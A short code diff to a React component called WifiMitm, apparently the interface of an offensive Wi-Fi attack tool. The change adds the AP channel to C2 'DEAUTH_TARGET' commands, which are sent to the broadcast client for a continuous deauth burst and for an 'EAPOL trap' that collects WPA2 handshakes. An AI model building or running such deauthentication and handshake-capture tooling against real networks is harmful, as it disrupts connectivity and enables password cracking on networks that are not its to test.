@@ -121,11 +121,11 @@ export default function WifiMitm({ functionIdx, lastAction, sendC2Action, access
       if (currentId === "deauth_burst") {
         setStatusLog(`DEAUTH: INYECTANDO FRAMES → ${targetAP.bssid}`);
         addLog(`DEAUTH CONTINUO → AP: "${targetAP.ssid}" CH${targetAP.channel} [30s]`);
-        sendC2Action("DEAUTH_TARGET", { bssid: targetAP.bssid, client: "FF:FF:FF:FF:FF:FF", currentId: "deauth_burst" });
+        sendC2Action("DEAUTH_TARGET", { bssid: targetAP.bssid, client: "FF:FF:FF:FF:FF:FF", channel : targetAP.channel, currentId: "deauth_burst" });
       } else if (currentId === "eapol_trap") {
         setStatusLog(`EAPOL: TRAMPA ACTIVA EN CH${targetAP.channel} → ${targetAP.bssid}`);
         addLog(`EAPOL TRAP → AP: "${targetAP.ssid}" — ESPERANDO 4 FRAMES WPA2...`);
-        sendC2Action("DEAUTH_TARGET", { bssid: targetAP.bssid, client: "FF:FF:FF:FF:FF:FF", currentId: "eapol_trap" });
+        sendC2Action("DEAUTH_TARGET", { bssid: targetAP.bssid, client: "FF:FF:FF:FF:FF:FF", channel : targetAP.channel, currentId: "eapol_trap" });
       }
       return;
     }
